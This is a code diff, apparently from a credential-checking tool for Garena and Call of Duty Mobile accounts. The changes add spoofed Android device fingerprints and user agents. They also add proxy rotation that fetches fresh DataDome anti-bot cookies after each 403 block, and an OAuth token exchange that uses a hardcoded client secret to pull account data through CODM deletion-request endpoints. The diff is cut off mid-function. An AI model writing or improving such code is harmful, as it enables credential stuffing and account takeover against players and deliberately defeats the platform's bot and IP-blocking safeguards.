@@ -1,4 +1,4 @@
-#Decode By Crazy | @PokiePy
+#Decode By Crazy | @Po
 import os
 import sys
 import time
@@ -184,6 +184,218 @@ class GeoRotator:
 
 # Singleton — created once, shared everywhere
 geo_rotator = GeoRotator()
+
+_ANDROID_DEVICES = [
+    ("SM-S928B",  "AP3A.241005.015"),
+    ("SM-S926B",  "AP2A.240905.003"),
+    ("SM-S918B",  "UP1A.231005.007"),
+    ("SM-S911B",  "UP1A.231005.007"),
+    ("SM-S906B",  "SP1A.210812.016"),
+    ("SM-S901B",  "SP1A.210812.016"),
+    ("SM-G991B",  "UP1A.231005.007"),
+    ("SM-A546B",  "UP1A.231005.007"),
+    ("SM-A156B",  "AP2A.240805.005"),
+    ("SM-A536B",  "SP1A.210812.016"),
+    ("SM-A346B",  "TP1A.220624.014"),
+    ("SM-A245F",  "TP1A.220624.014"),
+    ("SM-A235F",  "TP1A.220624.014"),
+    ("SM-A135F",  "TP1A.220624.014"),
+    ("Pixel 9 Pro",  "AP4A.250205.002"),
+    ("Pixel 8",      "AP2A.240905.003"),
+    ("Pixel 7a",     "UP1A.231005.007"),
+    ("Pixel 7",      "TQ3A.230901.001"),
+    ("Pixel 6a",     "TP1A.220905.004"),
+    ("Pixel 5",      "RD1A.200810.022"),
+    ("Pixel 4",      "PQ3A.190801.002"),
+    ("23127PN0CG",   "AP2A.240905.003"),
+    ("23049PCD8G",   "UKQ1.230804.001"),
+    ("2312DRA50G",   "UKQ1.230804.001"),
+    ("23021RAAEG",   "AQ3A.240829.003"),
+    ("2201116SG",    "UP1A.231005.007"),
+    ("22041219PG",   "AP1A.240505.005"),
+    ("22021211RG",   "TP1A.220624.014"),
+    ("2211133G",     "UP1A.231005.007"),
+    ("21091116AI",   "TKQ1.221114.001"),
+    ("M2102J20SG",   "RKQ1.211001.001"),
+    ("M2101K6G",     "AP1A.240405.002"),
+    ("23053RN02A",   "UKQ1.230804.001"),
+    ("22120RN86G",   "TKQ1.221114.001"),
+    ("21121119SG",   "TKQ1.221114.001"),
+    ("220333QAG",    "TKQ1.221114.001"),
+    ("CPH2609",   "TP1A.220624.014"),
+    ("CPH2591",   "AP2A.240805.005"),
+    ("CPH2551",   "TP1A.220624.014"),
+    ("CPH2385",   "SP1A.210812.016"),
+    ("CPH2269",   "RP1A.200720.011"),
+    ("V2307",     "TP1A.220624.014"),
+    ("V2254A",    "UP1A.231005.007"),
+    ("V2219",     "SP1A.210812.016"),
+    ("V2109",     "RP1A.200720.011"),
+    ("V2038",     "RP1A.200720.011"),
+    ("RMX3771",   "AP1A.240405.002"),
+    ("RMX3686",   "TP1A.220624.014"),
+    ("RMX3521",   "SP1A.210812.016"),
+    ("RMX3393",   "SP1A.210812.016"),
+    ("RMX3031",   "RP1A.200720.011"),
+    ("RMX2195",   "RP1A.200720.011"),
+    ("CPH2449",   "TP1A.220624.014"),
+    ("LE2125",    "AP1A.240505.005"),
+    ("LE2115",    "SP1A.210812.016"),
+    ("IN2025",    "UP1A.231005.007"),
+    ("IN2013",    "RP1A.200720.011"),
+    ("KB2003",    "AP2A.240805.005"),
+    ("POCO X5 Pro",  "TKQ1.221114.001"),
+    ("POCO F4",      "TKQ1.221114.001"),
+    ("POCO M4 Pro",  "SP1A.210812.016"),
+    ("POCO X4 GT",   "TP1A.220624.014"),
+    ("moto g84 5G",  "UKQ1.230917.001"),
+    ("moto g72",     "T2RLS33.69-23-6"),
+    ("moto e32",     "SRPWS31.Q3-46-39"),
+    ("XT2153-1",     "RPBS31.Q3-46-37"),
+    ("Lenovo TB-9707F",  "AP3A.240905.015.A2"),
+    ("Lenovo K13 Note",  "RP1A.200720.011"),
+    ("Nokia G60",  "TP1A.220624.014"),
+    ("Nokia X30",  "TP1A.220624.014"),
+    ("Nokia C32",  "TP1A.220624.014"),
+    ("X6833B",    "TP1A.220624.014"),
+    ("X6515",     "SP1A.210812.016"),
+    ("X669C",     "RP1A.200720.011"),
+    ("TECNO KI7",   "TP1A.220624.014"),
+    ("TECNO LG7n",  "TP1A.220624.014"),
+    ("XQ-BE52",   "TP1A.220624.014"),
+    ("XQ-DC54",   "UP1A.231005.007"),
+    ("ASUS_AI2205",  "TKQ1.221114.001"),
+    ("ASUS_I006D",   "SP1A.210812.016"),
+    ("ZTE Blade A73 5G",  "SP1A.210812.016"),
+    ("nubia Z50S Pro",    "TP1A.220624.014"),
+    ("ELS-NX9",   "HUAWEIELS-NX9"),
+    ("MAR-LX1B",  "HUAWEIMAR-LX1B"),
+    ("VOG-L29",   "HUAWEIVOG-L29"),
+]
+
+_CHROME_VERSIONS = [
+    "130.0.6723.86",  "131.0.6778.104", "132.0.6834.110",
+    "133.0.6917.92",  "134.0.6998.85",  "135.0.7049.100",
+    "136.0.7103.60",  "137.0.7151.78",  "138.0.7204.100",
+    "139.0.7258.60",  "140.0.7294.92",  "141.0.7328.86",
+    "142.0.7381.100", "143.0.7440.50",  "144.0.7559.59",
+]
+
+
+_ANDROID_VERSIONS = [11, 12, 13, 14, 15]
+
+_GARENA_SDK_VERSION = "5.12.1"
+
+
+def random_ua():
+    device, build = random.choice(_ANDROID_DEVICES)
+    chrome        = random.choice(_CHROME_VERSIONS)
+    android       = random.choice(_ANDROID_VERSIONS)
+    chrome_major  = chrome.split(".")[0]
+    dev_id        = f"02-{uuid.uuid4()}"
+
+    ua_full = (
+        f"Mozilla/5.0 (Linux; Android {android}; {device} "
+        f"Build/{build}; wv) AppleWebKit/537.36 "
+        f"(KHTML, like Gecko) Version/4.0 "
+        f"Chrome/{chrome} Mobile Safari/537.36; "
+        f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
+    )
+    ua_short = f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
+    return ua_full, ua_short, chrome_major, dev_id
+
+
+def build_garena_headers():
+    ua_full, _ua_short, chrome_major, _dev_id = random_ua()
+    return {
+        "User-Agent":        ua_full,
+        "Accept":            "application/json, text/plain, */*",
+        "Accept-Encoding":   "gzip, deflate, br, zstd",
+        "Accept-Language":   "en-US,en;q=0.9",
+        "sec-ch-ua":         (
+            f'"Chromium";v="{chrome_major}", '
+            f'"Not(A:Brand";v="8", '
+            f'"Android WebView";v="{chrome_major}"'
+        ),
+        "sec-ch-ua-mobile":   "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "same-origin",
+        "x-requested-with":   "com.garena.game.codm",
+        "Origin":             "https://100082.connect.garena.com",
+        "Referer": (
+            "https://100082.connect.garena.com/universal/oauth"
+            "?client_id=100082&locale=en-US&create_grant=true"
+            "&login_scenario=normal&redirect_uri=gop100082://auth/"
+            "&response_type=code"
+        ),
+    }
+
+
+class DeviceManager:
+
+    def __init__(self):
+        self._idx  = 0
+        self._lock = threading.Lock()
+
+    def get_next(self) -> dict:
+        with self._lock:
+            device, build = _ANDROID_DEVICES[self._idx % len(_ANDROID_DEVICES)]
+            self._idx += 1
+
+        chrome       = random.choice(_CHROME_VERSIONS)
+        android      = random.choice(_ANDROID_VERSIONS)
+        chrome_major = chrome.split(".")[0]
+        dev_id       = f"02-{uuid.uuid4()}"
+
+        ua_full = (
+            f"Mozilla/5.0 (Linux; Android {android}; {device} "
+            f"Build/{build}; wv) AppleWebKit/537.36 "
+            f"(KHTML, like Gecko) Version/4.0 "
+            f"Chrome/{chrome} Mobile Safari/137.36; "
+            f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
+        )
+        ua_short = (
+            f"GarenaMSDK/{_GARENA_SDK_VERSION}"
+            f"({device} ;Android {android};en;us;)"
+        )
+        return {
+            "device": device, "build": build,
+            "android": android, "chrome": chrome,
+            "chrome_major": chrome_major,
+            "device_id": dev_id,
+            "ua_full": ua_full, "ua_short": ua_short,
+        }
+
+    def get_random(self) -> dict:
+        
+        device, build = random.choice(_ANDROID_DEVICES)
+        chrome        = random.choice(_CHROME_VERSIONS)
+        android       = random.choice(_ANDROID_VERSIONS)
+        chrome_major  = chrome.split(".")[0]
+        dev_id        = f"02-{uuid.uuid4()}"
+        ua_full = (
+            f"Mozilla/5.0 (Linux; Android {android}; {device} "
+            f"Build/{build}; wv) AppleWebKit/537.36 "
+            f"(KHTML, like Gecko) Version/4.0 "
+            f"Chrome/{chrome} Mobile Safari/537.36; "
+            f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
+        )
+        ua_short = (
+            f"GarenaMSDK/{_GARENA_SDK_VERSION}"
+            f"({device} ;Android {android};en;us;)"
+        )
+        return {
+            "device": device, "build": build,
+            "android": android, "chrome": chrome,
+            "chrome_major": chrome_major,
+            "device_id": dev_id,
+            "ua_full": ua_full, "ua_short": ua_short,
+        }
+
+
+_device_manager = DeviceManager()
 
 def signal_handler(signum, frame):
     """Handle Ctrl+C - Exit immediately"""
@@ -463,7 +675,6 @@ class LiveStats:
             f"  {gray}Created by: {white}@xeryzs{reset}\n"
         )
 
-
 def encode(plaintext, key):
     key = bytes.fromhex(key)
     plaintext = bytes.fromhex(plaintext)
@@ -471,15 +682,18 @@ def encode(plaintext, key):
     ciphertext = cipher.encrypt(plaintext)
     return ciphertext.hex()[:32]
 
+
 def get_passmd5(password):
     decoded_password = urllib.parse.unquote(password)
     return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()
+
 
 def hash_password(password, v1, v2):
     passmd5 = get_passmd5(password)
     inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
     outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
     return encode(passmd5, outer_hash)
+
 
 def applyck(session, cookie_str):
     session.cookies.clear()
@@ -504,7 +718,7 @@ def applyck(session, cookie_str):
     else:
         logger.warning(f"[WARNING] No valid cookies found in the provided string")
 
-def get_datadome_cookie(session):
+def get_datadome_cookie(session, proxies=None):
     url = 'https://dd.garena.com/js/'
     headers = {
         'accept': '*/*',
@@ -539,9 +753,7 @@ def get_datadome_cookie(session):
     data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
 
     try:
-        # Use session (which has the thread's proxy set) instead of bare requests
-        # This ensures datadome is fetched through the same proxy as the thread
-        response = session.post(url, headers=headers, data=data, timeout=20)
+        response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=10)
         response.raise_for_status()
         response_json = response.json()
         
@@ -557,7 +769,8 @@ def get_datadome_cookie(session):
         return None
     
 def prelogin(session, account, datadome_manager, telegram_config=None):
-    url = 'https://sso.garena.com/api/prelogin'
+
+    url = 'https://100082.connect.garena.com/api/prelogin'
     
     try:
         account.encode('latin-1')
@@ -566,7 +779,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         return None, None, None
     
     params = {
-        'app_id': '10100',
+        'app_id': '100082',
         'account': account,
         'format': 'json',
         'id': str(int(time.time() * 1000))
@@ -584,21 +797,11 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             
             cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
             
-            headers = {
-                'accept': 'application/json, text/plain, */*',
-                'accept-encoding': 'gzip, deflate, br, zstd',
-                'accept-language': 'en-US,en;q=0.9',
-                'connection': 'keep-alive',
-                'host': 'sso.garena.com',
-                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
-                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
-            }
+            
+            headers = build_garena_headers()
+            headers['accept-encoding'] = 'gzip, deflate, br, zstd'
+            headers['connection'] = 'keep-alive'
+            headers['host'] = '100082.connect.garena.com'
             
             if cookie_header:
                 headers['cookie'] = cookie_header
@@ -606,7 +809,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             if attempt > 0:
                 logger.info(f"      🔄 Retry {attempt + 1}/{retries}")
             
-            response = session.get(url, headers=headers, params=params, timeout=30)
+            response = session.get(url, headers=headers, params=params, timeout=12)
             
             new_cookies = {}
             
@@ -640,24 +843,31 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             new_datadome = new_cookies.get('datadome')
             
             if response.status_code == 403:
-                logger.error(f"      🚫 Access denied (403)")
-                logger.error(f"      🛡️ Security check triggered")
-                
-                if new_cookies and attempt < retries - 2:
-                    logger.info(f"      🔄 Retrying with new cookies...")
-                    backoff(attempt)
+                console.print(f"      [bold blue]🚫 Access denied (403)[/bold blue]")
+                console.print(f"      [bold blue]🛡️ Security check triggered[/bold blue]")
+
+                if attempt < retries - 1:
+                    if geo_rotator and geo_rotator.total > 0:
+                        logger.info(f"      🔄 Switching IP to fetch fresh Cookie...")
+                        new_proxy = geo_rotator.force_rotate()
+                        session.proxies.update(new_proxy)
+                        fresh_dd = get_datadome_cookie(session, proxies=new_proxy)
+                        if fresh_dd:
+                            datadome_manager.set_datadome(fresh_dd)
+                            datadome_manager.set_session_datadome(session, fresh_dd)
+                            logger.info(f"      ✔ Fresh Cookie obtained — retrying...")
+                        else:
+                            logger.warning(f"      ⚠️ Could not fetch Cookie via new proxy — retrying anyway...")
+                    else:
+                        logger.info(f"      🔄 Retrying with new cookies...")
+                        time.sleep(0.3)
                     continue
-                
-                if datadome_manager.handle_403(session, telegram_config=telegram_config):
+
+                if datadome_manager.handle_403(session):
                     return "IP_BLOCKED", None, None
                 else:
                     logger.error(f"      🚨 IP blocked - cannot continue")
                     return None, None, new_datadome
-                
-                if attempt < retries - 2:
-                    backoff(attempt)
-                    continue
-                return None, None, new_datadome
             
             response.raise_for_status()
             
@@ -667,7 +877,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                 logger.error(f"      ✘ Invalid response format")
                 logger.error(f"      📄 Could not parse server response")
                 if attempt < retries - 1:
-                    backoff(attempt)
+                    time.sleep(0.3)
                     continue
                 return None, None, new_datadome
             
@@ -691,8 +901,8 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         except requests.exceptions.HTTPError as e:
             if hasattr(e, 'response') and e.response is not None:
                 if e.response.status_code == 403:
-                    logger.error(f"      🚫 Access denied (403)")
-                    logger.error(f"      🛡️ Security check triggered")
+                    console.print(f"      [bold blue]🚫 Access denied (403)[/bold blue]")
+                    console.print(f"      [bold blue]🛡️ Security check triggered[/bold blue]")
                     
                     new_cookies = {}
                     if 'set-cookie' in e.response.headers:
@@ -710,21 +920,28 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                                 except Exception as ex:
                                     pass
                     
-                    if new_cookies and attempt < retries - 2:
-                        logger.info(f"      🔄 Retrying with new cookies...")
-                        backoff(attempt)
+                    if attempt < retries - 1:
+                        if geo_rotator and geo_rotator.total > 0:
+                            logger.info(f"      🔄 Switching IP to fetch fresh Cookie...")
+                            new_proxy = geo_rotator.force_rotate()
+                            session.proxies.update(new_proxy)
+                            fresh_dd = get_datadome_cookie(session, proxies=new_proxy)
+                            if fresh_dd:
+                                datadome_manager.set_datadome(fresh_dd)
+                                datadome_manager.set_session_datadome(session, fresh_dd)
+                                logger.info(f"      ✔ Fresh Cookie obtained — retrying...")
+                            else:
+                                logger.warning(f"      ⚠️ Could not fetch Cookie via new proxy — retrying anyway...")
+                        else:
+                            logger.info(f"      🔄 Retrying with new cookies...")
+                            time.sleep(0.3)
                         continue
-                    
-                    if datadome_manager.handle_403(session, telegram_config=telegram_config):
+
+                    if datadome_manager.handle_403(session):
                         return "IP_BLOCKED", None, None
                     else:
                         logger.error(f"      🚨 IP blocked - cannot continue")
                         return None, None, new_cookies.get('datadome')
-                        
-                    if attempt < retries - 2:
-                        backoff(attempt)
-                        continue
-                    return None, None, new_cookies.get('datadome')
                 else:
                     logger.error(f"      ✘ HTTP {e.response.status_code}")
                     logger.error(f"      🖥️ Server error")
@@ -732,37 +949,26 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                 logger.error(f"      ✘ Connection error")
                 logger.error(f"      🌐 Could not reach server")
                 
-            if attempt < retries - 2:
-                backoff(attempt)
+            if attempt < retries - 1:
+                time.sleep(0.3)
                 continue
-        except requests.exceptions.ConnectionError as e:
-            logger.warning(f"      🔌 Proxy dead/rate-limited: {str(e)[:80]}")
-            return "CONN_ERROR", None, None
-
-        except requests.exceptions.Timeout as e:
-            logger.warning(f"      ⏱️ Proxy timeout: {str(e)[:80]}")
-            return "CONN_ERROR", None, None
-
         except Exception as e:
-            err = str(e)
-            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError')):
-                logger.warning(f"      🔌 Proxy connection failed: {err[:80]}")
-                return "CONN_ERROR", None, None
-            logger.error(f"      💥 Unexpected error: {err[:50]}")
-            if attempt < retries - 2:
-                backoff(attempt)
+            logger.error(f"      💥 Unexpected error: {str(e)[:50]}")
+            if attempt < retries - 1:
+                time.sleep(0.3)
                 
     return None, None, None
 
 
 def login(session, account, password, v1, v2):
     hashed_password = hash_password(password, v1, v2)
-    url = 'https://sso.garena.com/api/login'
+    
+    url = 'https://100082.connect.garena.com/api/login'
     params = {
-        'app_id': '10100',
+        'app_id': '100082',
         'account': account,
         'password': hashed_password,
-        'redirect_uri': 'https://account.garena.com/',
+        'redirect_uri': 'gop100082://auth/',
         'format': 'json',
         'id': str(int(time.time() * 1000))
     }
@@ -774,10 +980,19 @@ def login(session, account, password, v1, v2):
             cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
     cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
     
+    
     headers = {
         'accept': 'application/json, text/plain, */*',
-        'referer': 'https://account.garena.com/',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
+        'host': '100082.connect.garena.com',
+        'referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
+        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'x-requested-with': 'com.garena.game.codm',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)'
     }
     
     if cookie_header:
@@ -820,7 +1035,7 @@ def login(session, account, password, v1, v2):
             except json.JSONDecodeError:
                 logger.error(f"      ✘ Invalid JSON response from login")
                 if attempt < retries - 1:
-                    backoff(attempt)
+                    time.sleep(0.3)
                     continue
                 return None
             
@@ -836,7 +1051,7 @@ def login(session, account, password, v1, v2):
                 elif 'captcha' in error_msg.lower():
                     logger.warning(f"     ✘ Login failed: Captcha required")
                     logger.warning(f"         └─ 🤖 Reason: {error_msg}")
-                    backoff(attempt)
+                    time.sleep(0.5)
                     continue
                 else:
                     logger.warning(f"     ✘ Login failed: Invalid credentials")
@@ -848,165 +1063,170 @@ def login(session, account, password, v1, v2):
         except requests.RequestException as e:
             logger.error(f"      ✘ Login request failed (attempt {attempt + 1}): {e}")
             if attempt < retries - 1:
-                backoff(attempt)
+                time.sleep(0.3)
                 
     return None
 
 
 def get_codm_access_token(session):
-    """New OAuth flow using authorization code grant type"""
     try:
         random_id = str(int(time.time() * 1000))
-        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
-        grant_headers = {
-            'Host': '100082.connect.garena.com',
-            'Connection': 'keep-alive',
-            'sec-ch-ua-platform': '"Android"',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
-            'Accept': 'application/json, text/plain, */*',
-            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
-            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'sec-ch-ua-mobile': '?1',
-            'Origin': 'https://100082.connect.garena.com',
-            'X-Requested-With': 'com.garena.game.codm',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': 'en-US,en;q=0.9'
+        dev = _device_manager.get_next()
+
+        grant_url     = "https://100082.connect.garena.com/oauth/token/grant"
+        grant_headers = build_garena_headers()
+        grant_headers["Pragma"]       = "no-cache"
+        grant_headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
+
+        grant_data = {
+            "client_id": "100082",
+            "response_type": "code",
+            "redirect_uri": "gop100082://auth/",
+            "create_grant": "true",
+            "login_scenario": "normal",
+            "format": "json",
+            "id": random_id,
         }
-        
-        device_id = f'02-{str(uuid.uuid4())}'
-        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
-        
-        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
+
+        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=12)
+        grant_response.raise_for_status()
         grant_json = grant_response.json()
-        auth_code = grant_json.get('code', '')
-        
+
+        auth_code = grant_json.get("code")
         if not auth_code:
-            return ('', '', '')
-        
-        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
-        token_headers = {
-            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': '100082.connect.garena.com',
-            'Connection': 'Keep-Alive',
-            'Accept-Encoding': 'gzip'
-        }
-        
-        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
-        
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
-        token_json = token_response.json()
-        
-        access_token = token_json.get('access_token', '')
-        open_id = token_json.get('open_id', '')
-        uid = token_json.get('uid', '')
-        
-        return (access_token, open_id, uid)
-        
-    except Exception as e:
-        logger.error(f'Error getting CODM access token: {e}')
-        return ('', '', '')
+            logger.error("[ERROR] CODM token grant failed: no authorization code in response")
+            return ""
 
-def process_codm_callback(session, access_token, open_id=None, uid=None):
-    """Try multiple methods to get CODM info"""
-    try:
-        # Try old callback URL
-        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
-        old_headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
-            'referer': 'https://auth.garena.com/'
+        exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"
+        exchange_headers = {
+            "User-Agent": dev["ua_short"],
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/x-www-form-urlencoded",
         }
-        
-        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
-        location = old_response.headers.get('Location', '')
-        
-        if 'err=3' in location:
-            return (None, 'no_codm')
-        if 'token=' in location:
-            token = location.split('token=')[-1].split('&')[0]
-            return (token, 'success')
-        
-        # Try AOS callback
-        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
-        aos_headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
-            'referer': 'https://100082.connect.garena.com/',
-            'x-requested-with': 'com.garena.game.codm'
-        }
-        
-        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
-        aos_location = aos_response.headers.get('Location', '')
-        
-        if 'err=3' in aos_location:
-            return (None, 'no_codm')
-        if 'token=' in aos_location:
-            token = aos_location.split('token=')[-1].split('&')[0]
-            return (token, 'success')
-        
-        return (None, 'unknown_error')
-        
-    except Exception as e:
-        logger.error(f'Error processing CODM callback: {e}')
-        return (None, 'error')
 
-def get_codm_user_info(session, token):
-    """Get CODM user info using the delete token"""
+        exchange_data = {
+            "grant_type": "authorization_code",
+            "code": auth_code,
+            "device_id": dev["device_id"],
+            "redirect_uri": "gop100082://auth/",
+            "source": "2",
+            "client_id": "100082",
+            "client_secret": "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415",
+        }
+
+        exchange_response = session.post(exchange_url, headers=exchange_headers, data=exchange_data, timeout=12)
+        exchange_response.raise_for_status()
+        exchange_json = exchange_response.json()
+
+        access_token = exchange_json.get("access_token")
+        if not access_token:
+            logger.error("[ERROR] CODM token exchange failed: no access_token in response")
+            return ""
+
+        return access_token
+    except Exception as e:
+        logger.error(f"[ERROR] Error getting CODM access token: {e}")
+        return ""
+
+
+def process_codm_callback(session, access_token):
     try:
-        # Try to decode JWT token
-        parts = token.split('.')
-        if len(parts) == 3:
-            payload = parts[1]
-            padding = 4 - len(payload) % 4
-            if padding != 4:
-                payload += '=' * padding
-            decoded = base64.urlsafe_b64decode(payload)
-            jwt_data = json.loads(decoded)
-            user_data = jwt_data.get('user', {})
-            if user_data:
-                return {
-                    'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
-                    'codm_level': user_data.get('codm_level', 'N/A'),
-                    'region': user_data.get('region', 'N/A'),
-                    'uid': user_data.get('uid', 'N/A'),
-                    'open_id': user_data.get('open_id', 'N/A'),
-                    't_open_id': user_data.get('t_open_id', 'N/A')
-                }
-        
-        # Fallback to API call
-        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'codm-delete-token': token,
-            'origin': 'https://delete-request-aos.codm.garena.co.id',
-            'referer': 'https://delete-request-aos.codm.garena.co.id/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
-            'x-requested-with': 'com.garena.game.codm'
+        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
+        callback_headers = {
+            "authority": "auth.codm.garena.com",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
+            "pragma": "no-cache",
+            "referer": "https://auth.garena.com/",
+            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
         }
         
-        response = session.get(url, headers=headers, timeout=15)
-        data = response.json()
-        user_data = data.get('user', {})
+        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
         
-        if user_data:
-            return {
-                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
-                'codm_level': user_data.get('codm_level', 'N/A'),
-                'region': user_data.get('region', 'N/A'),
-                'uid': user_data.get('uid', 'N/A'),
-                'open_id': user_data.get('open_id', 'N/A'),
-                't_open_id': user_data.get('t_open_id', 'N/A')
-            }
+        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
+        api_callback_headers = {
+            "authority": "api-delete-request.codm.garena.co.id",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
+            "pragma": "no-cache",
+            "referer": "https://auth.garena.com/",
+            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "cross-site",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
